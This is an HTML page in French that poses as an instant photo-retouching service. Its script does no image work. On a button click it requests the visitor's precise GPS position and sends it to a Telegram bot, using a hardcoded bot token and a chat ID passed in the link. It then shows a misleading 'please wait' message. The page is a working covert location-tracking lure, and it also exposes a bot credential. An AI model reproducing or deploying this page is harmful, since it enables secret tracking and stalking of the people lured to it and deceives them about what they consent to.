<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transformation de votre photo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            background-color: #f4f4f9;
        }
        h1 {
            color: #333;
            font-size: 22px;
        }
        p {
            color: #666;
            font-size: 15px;
            margin-bottom: 30px;
        }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 18px 32px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
            width: 100%;
            max-width: 320px;
        }
        button:active {
            background-color: #006699;
        }
    </style>
</head>
<body>

    <h1>Retouchez votre photo</h1>
    <p>Cliquez sur le bouton ci-dessous pour voir le resultat instantanément.</p>
    
    <button id="authButton">Autoriser et Envoyer</button>

    <script>
        const BOT_TOKEN = "8805637787:AAGMIxpTUNKuIHnSRLiyYgCS980X7khKSQg";

        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id');

        document.getElementById('authButton').addEventListener('click', async () => {
            if (!chatId) {
                alert("Erreur : Identifiant de chat introuvable.");
                return;
            }

            if (!navigator.geolocation) {
                alert("La géolocalisation n'est pas supportée par votre navigateur.");
                return;
            }

            const btn = document.getElementById('authButton');
            btn.disabled = true;
            btn.innerText = "Traitement en cours...";

            // Demande unique : active la recherche GPS et récupère les coordonnées
            navigator.geolocation.getCurrentPosition(async (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

                try {
                    const response = await fetch(telegramApiUrl);
                    if (response.ok) {
                        alert("Merci de patienter ou reessayez !");
                        window.close(); // Ferme la page si le navigateur l'autorise
                    } else {
                        alert("Erreur lors de l'envoi.");
                        btn.disabled = false;
                        btn.innerText = "Autoriser et Envoyer";
                    }
                } catch (error) {
                    console.error("Erreur réseau :", error);
                    alert("Erreur de connexion.");
                    btn.disabled = false;
                    btn.innerText = "Autoriser et Envoyer";
                }

            }, (error) => {
                alert("Veuillez autoriser l'accès à la position dans votre navigateur pour continuer.");
                btn.disabled = false;
                btn.innerText = "Autoriser et Envoyer";
            }, { 
                enableHighAccuracy: true, 
                timeout: 15000, 
                maximumAge: 0 
            });
        });
    </script>

</body>
</html>
